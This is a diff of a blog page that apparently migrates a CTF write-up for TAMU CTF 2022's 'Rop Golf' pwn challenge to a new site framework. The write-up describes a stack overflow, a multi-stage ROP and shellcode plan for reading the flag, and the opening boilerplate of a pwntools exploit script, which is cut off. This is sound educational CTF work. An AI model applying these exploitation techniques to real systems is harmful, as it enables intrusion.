@@ -1,564 +1,283 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
-<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/static/favicon/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/static/favicon/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/static/favicon/favicon-16x16.png">
-  <link rel="mask-icon" href="/static/favicon/safari_pinned_tab.svg" color="#222">
-  <link rel="manifest" href="/static/favicon/site.webmanifest">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
-
-    <meta name="description" content="0x0 IntroductionAuthor: sky I keep on getting hacked by people using my shells! Now that I&#39;ve deleted all the nonessential programs off my computer I should be safe... right? The flag is in a *.tx">
-<meta property="og:type" content="website">
-<meta property="og:title" content="[Pwn] Rop Golf [Tamu CTF 2022]">
-<meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html">
-<meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="0x0 IntroductionAuthor: sky I keep on getting hacked by people using my shells! Now that I&#39;ve deleted all the nonessential programs off my computer I should be safe... right? The flag is in a *.tx">
-<meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-17T08:55:00.000Z">
-<meta property="article:modified_time" content="2022-04-17T08:55:00.000Z">
-<meta property="article:author" content="Aynakeya">
-<meta name="twitter:card" content="summary">
-
-
-<link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/rop_golf/">
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html","path":"ctf-writeup/2022/tamuctf/pwn/rop_golf/index.html","title":"[Pwn] Rop Golf [Tamu CTF 2022]"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>[Pwn] Rop Golf [Tamu CTF 2022] | Aynakeya's Blog
-</title>
-  
-
-
-
-
-
-
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
-<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
-<script src="/js/third-party/search/local-search.js" defer></script>
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-<!-- hexo injector head_end start -->
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
-<!-- hexo injector head_end end --></head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <div class="column">
-      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-        <span class="toggle-line"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Aynakeya's Blog</p>
-      <i class="logo-line"></i>
-    </a>
-      <p class="site-subtitle" itemprop="description">Kill My Emotion</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
-        <i class="fa fa-search fa-fw fa-lg"></i>
-    </div>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/blog/" rel="section"><i class="fa fa-house fa-fw"></i>Home</a></li><li class="menu-item menu-item-infosec"><a href="/categories/ctf" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>InfoSec</a></li><li class="menu-item menu-item-coding"><a href="/categories/coding" rel="section"><i class="fa fa-solid fa-code fa-fw"></i>Coding</a></li><li class="menu-item menu-item-anime"><a href="/categories/anime" rel="section"><i class="fa fa-solid fa-film fa-fw"></i>Anime</a></li><li class="menu-item menu-item-novel"><a href="/categories/novel" rel="section"><i class="fa fa-solid fa-book-open fa-fw"></i>Novel</a></li><li class="menu-item menu-item-life"><a href="/categories/life" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>Life</a></li><li class="menu-item menu-item-devops"><a href="/categories/devops" rel="section"><i class="fa fa-solid fa-terminal fa-fw"></i>DevOps</a></li><li class="menu-item menu-item-sceneseries"><a href="/scene-series" rel="section"><i class="fa fa-solid fa-book fa-fw"></i>SceneSeries</a></li><li class="menu-item menu-item-archives"><a href="/archives" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-ctf-writeup"><a href="/ctf-writeup" rel="section"><i class="fa fa-book fa-fw"></i>CTF-writeup</a></li><li class="menu-item menu-item-bookmarks"><a href="/bookmarks" rel="section"><i class="fa fa-bookmark fa-fw"></i>Bookmarks</a></li><li class="menu-item menu-item-tags"><a href="/tags" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-pages"><a href="/pages" rel="section"><i class="fas fa-folder fa-fw"></i>Pages</a></li><li class="menu-item menu-item-frontpage"><a href="/" rel="section"><i class="fa fa-leaf fa-fw"></i>Frontpage</a></li>
-      <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
-        </a>
-      </li>
-  </ul>
-</nav>
-
-
-
-  <div class="search-pop-overlay">
-    <div class="popup search-popup">
-      <div class="search-header">
-        <span class="search-icon">
-          <i class="fa fa-search"></i>
-        </span>
-        <div class="search-input-container">
-          <input autocomplete="off" autocapitalize="off" maxlength="80"
-                placeholder="Searching..." spellcheck="false"
-                type="search" class="search-input">
-        </div>
-        <span class="popup-btn-close" role="button">
-          <i class="fa fa-times-circle"></i>
-        </span>
-      </div>
-      <div class="search-result-container">
-        <div class="search-result-icon">
-          <i class="fa fa-spinner fa-pulse fa-5x"></i>
-        </div>
-      </div>
-    </div>
-  </div>
-
-</header>
-        
-  
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x0-Introduction"><span class="nav-number">1.</span> <span class="nav-text">0x0 Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x1-Mitigation"><span class="nav-number">2.</span> <span class="nav-text">0x1 Mitigation</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x2-Vulnerability"><span class="nav-number">3.</span> <span class="nav-text">0x2 Vulnerability</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x3-Exploit"><span class="nav-number">4.</span> <span class="nav-text">0x3 Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x4-Flag"><span class="nav-number">5.</span> <span class="nav-text">0x4 Flag</span></a></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Aynakeya"
-      src="/static/intro/images/avatar.jpg">
-  <p class="site-author-name" itemprop="name">Aynakeya</p>
-  <div class="site-description" itemprop="description">my blog~</div>
-</div>
-<div class="site-state-wrap animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives">
-          <span class="site-state-item-count">121</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-categories">
-          <a href="/categories/">
-        <span class="site-state-item-count">16</span>
-        <span class="site-state-item-name">categories</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags">
-        <span class="site-state-item-count">101</span>
-        <span class="site-state-item-name">tags</span></a>
-      </div>
-  </nav>
-</div>
-  <div class="links-of-author animated">
-      <span class="links-of-author-item">
-        <a href="https://github.com/aynakeya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;aynakeya" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="mailto:aynakeya.official@gmail.com" title="E-Mail → mailto:aynakeya.official@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
-      </span>
-      <span class="links-of-author-item">
-        <a href="https://space.bilibili.com/10003632" title="Bilibili → https:&#x2F;&#x2F;space.bilibili.com&#x2F;10003632" rel="noopener me" target="_blank"><i class="fas fa-video fa-fw"></i>Bilibili</a>
-      </span>
-  </div>
-
-        </div>
-      </div>
-    </div>
-
-    
-  </aside>
-
-
-    </div>
-
-    <div class="main-inner page posts-expand">
-
-
-    
-    
-    
-    <div class="post-block" lang="en"><header class="post-header">
-
-<h1 class="post-title" itemprop="name headline">[Pwn] Rop Golf [Tamu CTF 2022]
-</h1>
-
-<div class="post-meta-container">
-  <ul class="breadcrumb">
-            <li><a href="/ctf-writeup/">CTF-WRITEUP</a></li>
-            <li><a href="/ctf-writeup/2022/">2022</a></li>
-            <li><a href="/ctf-writeup/2022/tamuctf/">TAMUCTF</a></li>
-            <li><a href="/ctf-writeup/2022/tamuctf/pwn/">PWN</a></li>
-          <li>ROP_GOLF</li>
-  </ul>
-</div>
-
-</header>
-
-      
-      
-      
-      <div class="post-body">
-          <h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Author: sky</p>
-<p>I keep on getting hacked by people using my shells! Now that I&#39;ve deleted all the nonessential programs off my computer I should be safe... right?</p>
+<!DOCTYPE html><html data-astro-transition-scope="astro-nfpogox7-1" lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/regular/font.css"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/bold/font.css"><link rel="icon" href="/favicon.ico?v=2" sizes="16x16 32x32 48x48"><link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32.png?v=2"><link rel="icon" type="image/png" sizes="512x512" href="/icons/favicon.png?v=2"><link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png?v=2"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Aynakeya" href="/rss.xml"><link rel="canonical" href="https://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/rop_golf/"><meta name="generator" content="Astro v7.3.3"><title>[Pwn] Rop Golf [Tamu CTF 2022] | Aynakeya</title><meta name="description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:type" content="website"><meta property="og:title" content="[Pwn] Rop Golf [Tamu CTF 2022] | Aynakeya"><meta property="og:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta property="og:url" content="https://www.aynakeya.com/ctf-writeup/2022/tamuctf/pwn/rop_golf/"><meta property="og:image" content="https://www.aynakeya.com/images/avatar.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[Pwn] Rop Golf [Tamu CTF 2022] | Aynakeya"><meta name="twitter:description" content="Novel, Code, Anime. Notes and things worth keeping."><meta name="twitter:image" content="https://www.aynakeya.com/images/avatar.jpg"><script>
+  (() => {
+    function applyTheme() {
+      const savedTheme = localStorage.getItem('theme');
+      const themePreference = savedTheme === 'light' || savedTheme === 'dark' ? savedTheme : 'system';
+      document.documentElement.dataset.themePreference = themePreference;
+      document.documentElement.dataset.theme = themePreference === 'system'
+        ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light')
+        : themePreference;
+    }
+    applyTheme();
+    document.addEventListener('astro:after-swap', applyTheme);
+  })();
+</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CYDbzu1r.js"></script><link rel="stylesheet" href="/_astro/BaseLayout.CjWOxd-i.css"><link rel="stylesheet" href="/_astro/katex.DM9nOOGm.css"><style>.ctf-year{margin-bottom:24px}.ctf-year-title{align-items:baseline;gap:18px;margin:0 0 14px;padding:14px 24px;font-size:23px;display:flex}.ctf-year-title span{color:var(--muted);font-size:13px;font-weight:400}.ctf-events{grid-template-columns:repeat(2,minmax(0,1fr));gap:14px;display:grid}.ctf-event{flex-direction:column;justify-content:space-between;gap:20px;display:flex}.ctf-event h3{margin:0;font-size:19px}.ctf-event>div{color:var(--muted);justify-content:space-between;align-items:center;font-size:13px;display:flex}.ctf-event:hover{border-color:var(--accent)}.ctf-event:hover .icon{color:var(--accent)}.ctf-related h2{margin-bottom:16px;font-size:19px}.ctf-related>a{justify-content:space-between;gap:16px;padding:8px 0;font-size:15px;display:flex}.ctf-breadcrumbs,.ctf-meta{color:var(--muted);flex-wrap:wrap;align-items:center;gap:8px 14px;font-size:13px;display:flex}.ctf-breadcrumbs>span{color:var(--line)}.ctf-meta>a{color:var(--accent);margin-left:auto}.ctf-writeups,.ctf-back{max-width:1080px;margin:32px auto 0}.ctf-writeups>h2{align-items:center;gap:12px;font-size:23px;display:flex}.ctf-group{margin-top:24px}.ctf-group h3{color:var(--accent);background:var(--soft);border-radius:4px;margin:0;padding:8px 14px;font-size:14px}.ctf-group ul{margin:0;padding:0;list-style:none}.ctf-group a{border-bottom:1px solid var(--line);justify-content:space-between;align-items:center;gap:16px;padding:16px 14px;font-size:16px;display:flex}.ctf-group .icon{color:var(--muted)}.ctf-back{border-top:1px solid var(--line);color:var(--accent);padding-top:24px;font-size:14px}@media (width<=620px){.ctf-events{grid-template-columns:1fr}.ctf-event{gap:14px}.ctf-group a{padding-inline:0;font-size:15px}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: astro-nfpogox7-1; }@layer astro { ::view-transition-old(astro-nfpogox7-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-nfpogox7-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-nfpogox7-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }</style></head><body id="top"><a class="skip-link" href="#content">Skip to content</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Aynakeya home"><img src="/icons/favicon.png" alt="" width="32" height="32"><span>Aynakeya</span></a><nav class="site-nav" aria-label="Main navigation"><a href="/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m3 10 9-7 9 7M5 9v11h5v-6h4v6h5V9"></path></svg><span>Home</span></a><a href="/blog/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 4H5v16h14v-9M9 15l1-4L19 2l3 3-9 9-4 1Z"></path></svg><span>Writing</span></a><a href="/bookmarks/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 3h12v18l-6-4-6 4V3Z"></path></svg><span>Bookmarks</span></a><a href="/ctf-writeup/" aria-current="page"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3h18v5H3V3ZM5 8v13h14V8M10 12h4"></path></svg><span>CTF</span></a></nav><div class="header-tools"><a class="icon-button" href="/search/" aria-label="搜索文章与 CTF 归档" title="搜索文章与 CTF 归档"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 21l-5-5M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"></path></svg></a><button class="icon-button" id="theme-toggle" type="button" aria-label="当前：跟随系统；切换到浅色模式" title="当前：跟随系统；切换到浅色模式"><span data-theme-icon="light" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5M17 12a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"></path></svg></span><span data-theme-icon="dark" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.9 13A9 9 0 0 1 11 3.1 9 9 0 1 0 20.9 13Z"></path></svg></span><span data-theme-icon="system"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 4h18v13H3V4ZM12 17v4M8 21h8"></path></svg></span></button></div></div></header><script type="module">var e=document.documentElement,t=matchMedia(`(prefers-color-scheme: dark)`),n={light:{label:`浅色模式`,next:`dark`},dark:{label:`深色模式`,next:`system`},system:{label:`跟随系统`,next:`light`}};function r(){let r=e.dataset.themePreference;e.dataset.theme=r===`system`?t.matches?`dark`:`light`:r;let i=document.querySelector(`#theme-toggle`),a=i.querySelectorAll(`[data-theme-icon]`),o=n[r],s=`当前：${o.label}；切换到${n[o.next].label}`;i.setAttribute(`aria-label`,s),i.title=s,a.forEach(e=>{e.hidden=e.dataset.themeIcon!==r})}r(),document.addEventListener(`astro:after-swap`,r),document.addEventListener(`click`,t=>{if(!(t.target instanceof Element)||!t.target.closest(`#theme-toggle`))return;let i=n[e.dataset.themePreference].next;e.dataset.themePreference=i,localStorage.setItem(`theme`,i),r()}),t.addEventListener(`change`,()=>{e.dataset.themePreference===`system`&&r()});</script><div class="site-shell"><aside class="site-sidebar" aria-label="个人信息与文章目录"><section class="profile-card panel" aria-label="About Aynakeya"><a class="profile-avatar" href="/" aria-label="Aynakeya home"><img src="/images/avatar.jpg" alt="Aynakeya 的头像" width="208" height="208"></a><div class="profile-identity"><p class="profile-name">Aynakeya</p><p class="profile-interests">相信的心就是你的魔法</p><div class="social-links"><a href="https://github.com/aynakeya">GitHub</a><a href="mailto:aynakeya.official@gmail.com">Email</a><a href="https://space.bilibili.com/10003632">Bilibili</a></div></div><div class="site-stats"><a href="/blog/archives/"><strong>121</strong><span>文章</span></a><a href="/blog/categories/"><strong>16</strong><span>分类</span></a><a href="/blog/tags/"><strong>101</strong><span>标签</span></a></div></section><details class="toc" open><summary>文章目录</summary><nav aria-label="Table of contents"><ol><li style="--depth: 0"><a href="#0x0-introduction">0x0 Introduction</a></li><li style="--depth: 0"><a href="#0x1-mitigation">0x1 Mitigation</a></li><li style="--depth: 0"><a href="#0x2-vulnerability">0x2 Vulnerability</a></li><li style="--depth: 0"><a href="#0x3-exploit">0x3 Exploit</a></li><li style="--depth: 0"><a href="#0x4-flag">0x4 Flag</a></li></ol></nav></details><script type="module">var e=matchMedia(`(max-width: 800px)`);function t(){let t=document.querySelector(`.toc`);t&&(t.open=!e.matches)}t(),document.addEventListener(`astro:after-swap`,t),e.addEventListener(`change`,t);</script></aside><div class="site-main"><main id="content" tabindex="-1"><article class="paper article-page ctf-page"><header class="post-header"><nav class="ctf-breadcrumbs" aria-label="Breadcrumb"><a href="/ctf-writeup/">CTF Archive</a><span>/</span><a href="/ctf-writeup/#2022">2022</a><span>/</span><a href="/ctf-writeup/2022/tamuctf/">Tamu CTF 2022</a></nav><h1>[Pwn] Rop Golf [Tamu CTF 2022]</h1><div class="ctf-meta"><span class="heading-count">历史归档</span><span>Pwn</span><a href="https://github.com/aynakeya/ctf-writeup/tree/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2022/tamuctf/pwn/rop_golf">GitHub 附件 <svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14m-6-6 6 6-6 6"></path></svg></a></div></header><div class="prose"><p><a id="0x0-Introduction"></a></p>
+<h1 id="0x0-introduction">0x0 Introduction</h1>
+<p>Author: sky</p>
+<p>I keep on getting hacked by people using my shells! Now that I've deleted all the nonessential programs off my computer I should be safe... right?</p>
 <p>The flag is in a *.txt file with a randomly generated name inside the same directory as the binary.</p>
 <p>SNI: rop-golf</p>
-<p>files: <a target="_blank" rel="noopener" href="https://github.com/aynakeya/ctf-writeup/blob/main/2022/tamuctf/pwn/rop_golf/rop_golf">rop_golf</a>, <a href="rop_golf.c">rop_golf.c</a>, glibc 2.28</p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>looking at the binary, the binary is contains a very simple buffer overflow vulnerability in funtion <code>vuln</code>. So in total, we have 72 -32 -8 &#x3D; 32 bytes for buffer overflow.</p>
+<p>files: <a href="https://github.com/aynakeya/ctf-writeup/blob/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2022/tamuctf/pwn/rop_golf/rop_golf">rop_golf</a>, <a href="https://github.com/aynakeya/ctf-writeup/blob/bae056dc4e13cd8dcb3be751b53e2f7adb7fc7b9/2022/tamuctf/pwn/rop_golf/rop_golf.c">rop_golf.c</a>, glibc 2.28</p>
+<p><a id="0x1-Mitigation"></a></p>
+<h1 id="0x1-mitigation">0x1 Mitigation</h1>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>    Arch:     amd64-64-little</span></span>
+<span class="line"><span>    RELRO:    Partial RELRO</span></span>
+<span class="line"><span>    Stack:    No canary found</span></span>
+<span class="line"><span>    NX:       NX enabled</span></span>
+<span class="line"><span>    PIE:      No PIE (0x400000)</span></span></code></pre>
+<p><a id="0x2-Vulnerability"></a></p>
+<h1 id="0x2-vulnerability">0x2 Vulnerability</h1>
+<p>looking at the binary, the binary is contains a very simple buffer overflow vulnerability in funtion <code>vuln</code>. So in total, we have 72 -32 -8 = 32 bytes for buffer overflow.</p>
 <p>We can do 4 rop operation.</p>
-<p>However, the challenge server remove all the binary under <code>/bin</code>, <code>/usr/bin/</code>... So we are not able get a shell using <code>system(&#39;/bin/sh&#39;)</code>. </p>
+<p>However, the challenge server remove all the binary under <code>/bin</code>, <code>/usr/bin/</code>... So we are not able get a shell using <code>system('/bin/sh')</code>.</p>
 <p>So, In order to read the flag, we need to first manually do a <code>ls</code> to see what is flag name. Secondly, use <code>open</code>, <code>read</code>, <code>write</code> syscall to read the flag file and output to stdout.</p>
-<p>Here is one way of manually doing <code>ls</code>, <a target="_blank" rel="noopener" href="https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html">https://www.gnu.org/software/libc/manual/html_node&#x2F;Simple-Directory-Lister.html</a></p>
-<pre class="line-numbers language-none"><code class="language-none">void vuln() &#123;
-    char buf[32];
-    read(0, buf, 72);
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
+<p>Here is one way of manually doing <code>ls</code>, <a href="https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html">https://www.gnu.org/software/libc/manual/html_node/Simple-Directory-Lister.html</a></p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>void vuln() {</span></span>
+<span class="line"><span>    char buf[32];</span></span>
+<span class="line"><span>    read(0, buf, 72);</span></span>
+<span class="line"><span>}</span></span></code></pre>
 <p>Here is my solution</p>
 <ol>
 <li>In the first rop chain, using puts to leak libc address and return back to <code>vuln</code></li>
 <li>In the second rop chain, use <code>pop rdx; ret</code>, <code>0x200</code>, <code>read addr</code>. So that I can write 0x200 more data on the stack and construct a larger rop chain. (I can do stack pivot here but im kind of lazy to do that)</li>
 <li>In the third rop chain, which is now 0x200 bytes long. I first do <code>mprotect</code> on some memory pages so that i could put shellcode and gadgets on it. Then, i call <code>read</code> again to write shellcodes and essential gadgets into the memory page. Finally, I use rop chain to do a manually <code>ls</code> and read the flag.</li>
 </ol>
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><pre class="line-numbers language-none"><code class="language-none">from pwn import *
-
-
-class BinaryInfo:
-    exe &#x3D; &quot;rop_golf_patched&quot;
-    libc &#x3D; &quot;libc.so.6&quot;
-
-    host &#x3D; &quot;rua.host.goes.here&quot;
-    port &#x3D; 8000
-
-
-# Set up pwntools for the correct architecture
-exe &#x3D; context.binary &#x3D; ELF(BinaryInfo.exe)
-exe_rop &#x3D; ROP(exe)
-if BinaryInfo.libc !&#x3D; &quot;&quot;:
-    libc &#x3D; ELF(BinaryInfo.libc)
-    libc_rop &#x3D; ROP(libc)
-else:
-    libc &#x3D; None
-    libc_rop &#x3D; None
-
-
-# Many built-in settings can be controlled on the command-line and show up
-# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
-# for all created processes...
-# .&#x2F;exploit.py DEBUG NOASLR
-# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
-host &#x3D; args.HOST or BinaryInfo.host
-port &#x3D; int(args.PORT or BinaryInfo.port)
-
-
-def start_local(argv&#x3D;[], *a, **kw):
-    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
-    if args.GDB:
